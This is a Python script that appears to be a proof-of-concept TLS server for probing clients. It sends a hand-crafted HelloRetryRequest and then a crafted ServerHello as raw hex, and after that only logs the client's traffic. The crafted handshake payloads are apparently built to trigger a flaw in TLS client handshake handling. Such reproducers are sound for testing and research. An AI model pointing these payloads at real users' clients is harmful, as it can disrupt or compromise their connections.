import socket

HOST = "0.0.0.0"
PORT = 3000

payload1 = bytes.fromhex(
    "1603030038020000340303cf21ad74e59a6111be1d8c021e65b891c2a211167abb8c5e079e09e2c8a8339c00130200000c002b00020304003300020018"
)
payload2 = bytes.fromhex(
    "160303009b020000970303010101010101010101010101010101010101010101010101010101010101010100130300006f003300650018006104533ee5bf40ec2d67988b77f317489bb6df952925c709fc0381111a5956f2d758110e59d3d7c1729e2c0d70eaf773e6120116426de2436a2f5fdd7fe54faf952b04fd13f516ce627f89d2019d4c8796959e4333c7065b496ca634d5dc63bde91f002b00020304"
)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    print(f"[*] Listening on {HOST}:{PORT} ...")

    # Accept client connection
    conn, addr = server_socket.accept()
    with conn:
        print(f"[+] Connection from {addr}")

        # Wait for ClientHello
        data = conn.recv(1024)
        print(f"[>] Received: {data.hex()}")

        # Send HRR
        conn.sendall(payload1)
        print(f"[<] Sent: {payload1.hex()}")

        # Wait for second ClientHello
        data = conn.recv(1024)
        print(f"[>] Received: {data.hex()}")

        # Send ServerHello
        conn.sendall(payload2)
        print(f"[<] Sent: {payload2.hex()}")

        while True:
            data = conn.recv(1024)
            print(f"[>] Received: {data.hex()}")


